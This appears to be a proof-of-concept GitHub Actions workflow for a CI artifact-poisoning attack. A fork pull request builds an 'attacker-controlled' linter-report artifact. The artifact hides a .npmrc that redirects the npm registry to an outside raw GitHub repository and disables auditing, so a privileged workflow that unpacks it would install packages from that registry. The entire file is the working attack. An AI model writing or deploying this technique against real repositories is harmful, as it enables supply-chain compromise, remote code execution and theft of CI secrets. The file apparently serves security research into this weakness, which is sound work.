---
name: PR validation
on:
  pull_request:

jobs:
  forged:
    runs-on: ubuntu-latest
    steps:
      - name: Craft attacker-controlled linter-report artifact
        run: |
          mkdir -p payload
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/\naudit=false\nfund=false\nprogress=false\n' > payload/.npmrc
          printf 'fork-PR controlled report\n' > payload/linter-report.txt
          printf '%s\n' "${{ github.event.pull_request.number }}" > payload/pr-number.txt
          ls -la payload
      - name: Upload linter report
        uses: actions/upload-artifact@v4
        with:
          name: linter-report
          path: payload/
          include-hidden-files: true
